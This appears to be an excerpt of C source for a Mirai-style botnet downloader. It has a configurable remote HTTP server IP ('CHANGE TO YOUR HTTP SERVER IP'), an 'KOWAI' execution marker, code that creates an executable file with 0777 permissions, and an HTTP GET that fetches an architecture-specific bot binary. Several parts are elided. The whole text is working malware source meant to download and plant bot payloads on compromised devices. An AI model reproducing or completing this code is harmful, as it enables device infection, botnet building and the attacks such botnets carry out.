...
#define HTTP_SERVER utils_inet_addr(178,128,154,119) // CHANGE TO YOUR HTTP SERVER IP

#define EXEC_MSG            "KOWAI\n"
#define EXEC_MSG_LEN        6

#define DOWNLOAD_MSG        "dad\n"
...
inline void run(void)
{
    ...
    ffd = open("5aA3", O_WRONLY | O_CREAT | O_TRUNC, 0777);
    ...
    if (write(sfd, "GET /8" BOT_ARCH "8 HTTP/1.0\r\n\r\n", 6 + arch_strlen + 14) != (6 + arch_strlen + 14))
    {
#ifdef DEBUG
